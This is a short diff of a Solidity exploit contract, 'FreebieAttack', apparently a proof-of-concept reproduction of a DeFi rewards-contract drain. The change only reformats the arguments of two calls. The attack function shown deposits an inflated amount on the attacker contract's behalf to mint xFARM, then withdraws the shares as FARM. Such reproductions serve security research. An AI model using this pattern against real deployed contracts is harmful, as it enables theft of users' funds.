@@ -21,19 +21,11 @@ contract FreebieAttack is IAdvisor {
     }
 
     function attack() public {
-        rewardsAdvisor.deposit({
-            farmDeposit: 10000e22,
-            from: payable(address(this)),
-            to: address(this)
-        });
+        rewardsAdvisor.deposit({farmDeposit: 10000e22, from: payable(address(this)), to: address(this)});
 
         console.log("xFARM minted:", xFarm.balanceOf(address(this)));
 
-        rewardsAdvisor.withdraw({
-            shares: xFarm.balanceOf(address(this)),
-            to: msg.sender,
-            from: payable(address(this))
-        });
+        rewardsAdvisor.withdraw({shares: xFarm.balanceOf(address(this)), to: msg.sender, from: payable(address(this))});
 
         console.log("FARM:", farm.balanceOf(msg.sender));
     }
